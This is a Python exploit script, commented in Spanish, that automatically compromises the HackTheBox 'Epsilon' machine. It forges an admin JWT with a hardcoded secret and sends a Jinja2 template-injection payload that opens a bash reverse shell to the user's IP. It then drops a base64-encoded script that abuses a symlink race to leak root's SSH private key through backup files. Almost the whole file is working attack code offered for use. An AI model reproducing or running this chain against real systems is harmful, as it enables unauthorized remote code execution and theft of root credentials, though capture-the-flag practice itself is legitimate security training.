import os
import time
import sys
from django.http import cookie
import requests
from colorama import init,Fore,Style
import signal
import jwt

def def_handler(sig, frame):
    print(f'{Fore.RED}\n[-]Exit')
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

print(f'''{Fore.MAGENTA}   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print(f'''{Fore.BLUE}  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(f'''{Fore.MAGENTA} _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print(f'''{Fore.CYAN}|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print(f'\n{Fore.BLUE}JAGGEDMULE14 - EPSILON HACKTHEBOX\n')

ip = input(f'{Fore.CYAN}Introduce tu IP (tun0): ')
port = int(input(f'\n{Fore.RED}[!]IMPORTANTE{Fore.GREEN}\n\nSi el puerto que quieres está por debajo del 1024 requeriras ejecutar este script como root\nrecomiendo un puerto superior al 1024\n\n{Fore.CYAN}Puerto con el que quieras romper la mamona: '))
from pwn import *

def ping(host):
    ping = os.system(f'ping -c 1 {host} >/dev/null 2>&1')
    if ping == 0:
        return True
    else:
        return False

if ping('10.10.11.134') == True:
    print(f'{Fore.GREEN}\n[+]Conexión exitosa')
    time.sleep(0.1)
    r5000 = requests.get('http://10.10.11.134:5000')
    r80 = requests.get('http://10.10.11.134')

    if r5000.status_code == 200 and r80.status_code == 403:
        print(f'{Fore.GREEN}[+]HTTP 80 / {r80.status_code} Forbidden')
        time.sleep(0.1)
        print(f'{Fore.GREEN}[+]HTTP 5000 / {r5000.status_code} OK')
        token = jwt.encode({'username' : 'admin'}, 'RrXCv`mrNe!K!4+5`wYq', algorithm = 'HS256')
        time.sleep(0.1)
        print(f'{Fore.GREEN}[+]JWT : {token}')
        cookies = {'auth' : f'{token}'}
        rhome = requests.get('http://10.10.11.134:5000/home', cookies=cookies)
        if 'Welcome Admin' in rhome.text:
            time.sleep(0.1)
            print(f'{Fore.GREEN}[+]Logue como admin exitoso')
            def shell():
                rcedata = {'costume' : '''{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/%s/%d 0>&1"').read()}}''' % (ip, port)}
                requests.post('http://10.10.11.134:5000/order', data=rcedata, cookies=cookies)
            
            try:
                threading.Thread(target=shell).start()
            except Exception as e:
                print(f'{Fore.RED}[-]{e}')
            shellc = listen(port, timeout=5).wait_for_connection()
            
            if shellc.sock is None:
                print(f'{Fore.RED}[-]No se pudo entablar la conexión')
                sys.exit(1)
            else:
                print(f'{Fore.GREEN}[+]Conexión exitosa')
                shellc.sendline('export TERM=xterm')
                time.sleep(0.1)
                shellc.sendline('echo -n "IyEvYmluL2Jhc2gKCndoaWxlIHRydWU7IGRvCglpZiBbIC1lIC9vcHQvYmFja3Vwcy9jaGVja3N1bSBdOyB0aGVuCgkJcm0gL29wdC9iYWNrdXBzL2NoZWNrc3VtCgkJZWNobyAiWytdRXNwZXJhLi4uIgoJCWxuIC1zIC1mIC9yb290Ly5zc2gvaWRfcnNhIC9vcHQvYmFja3Vwcy9jaGVja3N1bQoJCWJyZWFrCglmaQpkb25lCg==" | base64 -d > pito.sh; chmod +x pito.sh')
                print(f'{Fore.GREEN}[+]Porfavor espera')
                shellc.sendline('./pito.sh')
                time.sleep(0.1)
                print(f'{Fore.YELLOW}\n\n[!]ESPERA Y CUANDO SE TE OTORGUE LA SHELL SOLO EXTRAE LOS/EL .TAR EN /var/backups/web_backups Y ENCONTRARÁS LA ID_RSA DE ROOT, PUEDES UTILIZAR EL COMANDO cp /var/backups/web_backups/*.tar /tmp PARA COPIAR EN EL DIRECTIORIO /tmp Y tar -xf ejemplo.tar PARA EXTRAER\n\n')
                shellc.interactive()


        else:
            print(f'{Fore.RED}[-]Algo salió mal al loguearse')
            sys.exit(1)  
    else:
        print(f'{Fore.RED}[-]Algo salió mal')
        time.sleep(0.1)
        print(f'{Fore.RED}[-]HTTP 80 / {r80.status_code}')
        time.sleep(0.1)
        print(f'{Fore.RED}[-]HTTP 5000 / {r5000.status_code}')
        sys.exit(1)
else:
    print(f'{Fore.RED}\n[-]Conexión fallida')
    time.sleep(0.1)
    print('[-]Verifica la conectividad con la máquina')
    time.sleep(0.1)
    print('[-]Intenta correr el script de nuevo')
    sys.exit(1)